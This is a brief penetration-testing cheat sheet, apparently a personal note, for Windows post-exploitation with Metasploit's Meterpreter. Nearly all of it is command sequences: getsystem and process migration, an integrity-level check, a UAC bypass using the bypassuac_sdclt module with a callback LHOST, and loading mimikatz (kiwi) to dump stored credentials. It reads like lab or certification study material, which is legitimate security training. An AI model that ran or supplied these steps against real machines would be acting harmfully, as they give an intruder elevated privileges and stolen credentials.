---
tags:
  - tool
  - windows
  - privilege_escalation
  - metasploit
---
# Meterpreter

```bash
# Post exploitation command flow
getsystem
ps
migrate 8044
getuid

shell
powershell -ep bypass
Import-Module NtObjectManager
Get-NtTokenIntegrityLevel
```

[NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/1.1.32)

In this example, `Get-NtTokenIntegrityLevel` returns `Medium`, meaning we have to bypass UAC

```bash
^Z
y
bg
search UAC
use exploit/windows/local/bypassuac_sdclt
show options
set SESSION 9
set LHOST 192.168.119.4
run
```

Now we can check our integrity level once again

```bash
shell
powershell -ep bypass
Import-Module NtObjectManager
Get-NtTokenIntegrityLevel
```

Which returns `High` now

We can also load `mimikatz` from `meterpreter`

```bash
load kiwi
help
creds_msv
```
